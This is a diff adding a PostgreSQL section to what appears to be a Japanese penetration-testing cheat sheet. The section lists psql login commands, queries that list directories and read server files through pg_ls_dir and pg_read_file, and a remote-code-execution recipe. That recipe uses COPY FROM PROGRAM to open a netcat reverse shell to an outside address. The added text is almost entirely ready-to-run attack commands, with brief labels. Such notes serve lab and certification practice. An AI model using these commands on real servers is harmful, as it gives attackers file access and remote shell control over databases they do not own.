@@ -1580,6 +1580,31 @@ create user <追加するusername>@<host name> IDENTIFIED BY <password>;
 grant all privileges on test_db.* to <username>@<host name> IDENTIFIED BY <password>;
 ```
 
+## PostgreSQL(5432)
+```
+psql -h 192.168.227.47 -U postgres
+psql -h 192.168.227.47 -p 5437 -U postgres
+```
+- -h...ホスト名の指定
+- -U...ユーザ名
+- -p...ポートの指定
+
+```
+# PostgreSQL ディレクトリの一覧
+postgres=# select pg_ls_dir('./');
+
+# サーバ側のpostgresファイル読み取り
+postgres=# select pg_read_file('PG_VERSION', 0, 200);
+```
+
+### RCE
+```
+postgres=# CREATE TABLE cmd_exec(cmd_output text);
+CREATE TABLE
+
+postgres=# COPY cmd_exec FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.227 80 >/tmp/f';
+```
+
 ## Redis(6379)
 ```
 redis-cli -h 10.10.10.160
